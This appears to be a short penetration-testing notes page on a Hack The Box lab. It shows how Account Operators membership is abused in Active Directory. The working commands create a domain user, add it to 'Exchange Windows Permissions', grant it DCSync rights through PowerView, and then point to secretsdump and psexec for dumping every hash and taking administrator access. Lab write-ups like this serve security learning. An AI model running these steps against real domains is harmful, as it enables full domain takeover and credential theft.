# Account Operators

![](<../../../.gitbook/assets/image (76).png>)

Notice how the user we are in is part of a group that is part of account operators. Since we are part of Account Operators we can add a new user to the domain.&#x20;

```
net user lyethar password /add /domain
```

We add ourselves to a group we are also part of as the current user. This is the "Exchange Windows Permissions" group.

```
net group "Exchange Windows Permissions"  /add lyethar
```

We upload Powerview.ps1 and run the following commands.

```
$pass= ConvertTo-SecureString 'password' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('DOMAINNAME\lyethar', $pass)
Add-DomainObjectAcl  -Credential $cred  -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity lyethar -Rights DCSync
```

Then with the user we created, we run secrets dump to dump all the hashes and then psexec to log in as the administrator.&#x20;
